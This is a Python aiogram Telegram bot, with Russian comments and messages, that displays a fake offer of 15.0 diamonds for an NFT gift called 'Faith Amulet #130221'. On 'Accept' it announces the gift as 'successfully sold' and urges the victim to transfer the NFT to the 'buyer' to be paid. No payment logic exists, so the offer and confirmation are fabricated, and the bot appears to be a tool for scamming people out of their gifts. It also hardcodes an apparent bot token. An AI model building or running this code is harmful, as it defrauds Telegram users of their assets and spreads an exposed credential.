import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton

# Ваш токен бота
TOKEN = "8919998480:AAG2n5NPWx8mcRZOPxcZ3fZn9CvXUG44TFk"

bot = Bot(token=TOKEN)
dp = Dispatcher()

@dp.message(Command("offer"))
async def cmd_offer(message: Message):
    # Разбираем аргументы команды (ссылку)
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply("Использование: `/offer <ссылка_на_nft>`", parse_mode="Markdown")
        return
    
    nft_link = args[1]
    
    # Форматирование карточки подарка
    text = (
        "<b>Telegram</b>\n"
        "<b>Faith Amulet #130221</b>\n\n"
        f"Пользователь <code>{message.from_user.first_name}</code> предлагает Вам 15.0 💎 за подарок."
    )

    # Инлайн-кнопки для первого шага
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="ПОКАЗАТЬ ПОДАРОК", url=nft_link)
        ],
        [
            InlineKeyboardButton(text="Отклонить", callback_data="reject"),
            InlineKeyboardButton(text="Принять", callback_data="accept")
        ]
    ])

    await message.answer(text, reply_markup=keyboard, parse_mode="HTML")

# Обработка нажатия кнопки "Принять"
@dp.callback_query(F.data == "accept")
async def process_accept(callback: CallbackQuery):
    user = callback.from_user
    # Автоматически определяем ник или имя пользователя, который нажал кнопку
    username_display = f"@{user.username}" if user.username else user.first_name
    user_link = f"https://t.me/{user.username}" if user.username else f"tg://user?id={user.id}"

    # Новый текст сообщения после принятия
    new_text = (
        "<b>Telegram</b>\n"
        "<b>Faith Amulet #130221</b>\n\n"
        "Подарок: FaithAmulet#130221 успешно продан!\n\n"
        "Передайте подарок покупателю для зачисления 15.0 💎."
    )

    # Новые кнопки с динамическим ником покупателя
    new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="ПОКАЗАТЬ ПОДАРОК", url="https://t.me/nft/")
        ],
        [
            InlineKeyboardButton(text=f"Передать NFT {username_display}", url=user_link)
        ],
        [
            InlineKeyboardButton(text="Как передать", callback_data="how_to")
        ]
    ])

    # Редактируем существующее сообщение
    await callback.message.edit_text(new_text, reply_markup=new_keyboard, parse_mode="HTML")
    await callback.answer("Сделка принята!")

# Обработка нажатия кнопки "Отклонить"
@dp.callback_query(F.data == "reject")
async def process_reject(callback: CallbackQuery):
    await callback.message.edit_text("❌ Предложение отклонено.")
    await callback.answer()

# Обработка кнопки "Как передать"
@dp.callback_query(F.data == "how_to")
async def process_how_to(callback: CallbackQuery):
    await callback.answer("Инструкция по передаче подарка...", show_alert=True)

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
